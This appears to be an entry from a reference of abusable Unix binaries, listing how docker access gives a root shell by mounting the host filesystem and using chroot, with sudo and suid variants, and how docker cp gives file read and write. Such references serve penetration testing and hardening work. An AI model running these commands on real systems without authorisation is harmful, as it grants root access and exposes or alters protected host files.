---
description: |
  This requires the user to be privileged enough to run docker, i.e. being in the `docker` group or being `root`.

  Any other Docker Linux image should work, e.g., `debian`.
functions:
  shell:
    - description: The resulting is a root shell.
      code: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  file-write:
    - description: Write a file by copying it to a temporary container and back to the target destination on the host.
      code: |
        CONTAINER_ID="$(docker run -d alpine)" # or existing
        TF=$(mktemp)
        echo "DATA" > $TF
        docker cp $TF $CONTAINER_ID:$TF
        docker cp $CONTAINER_ID:$TF file_to_write
  file-read:
    - description: Read a file by copying it to a temporary container and back to a new location on the host.
      code: |
        CONTAINER_ID="$(docker run -d alpine)"  # or existing
        TF=$(mktemp)
        docker cp file_to_read $CONTAINER_ID:$TF
        docker cp $CONTAINER_ID:$TF $TF
        cat $TF
  sudo:
    - description: The resulting is a root shell.
      code: sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  suid:
    - description: The resulting is a root shell.
      code: ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
---
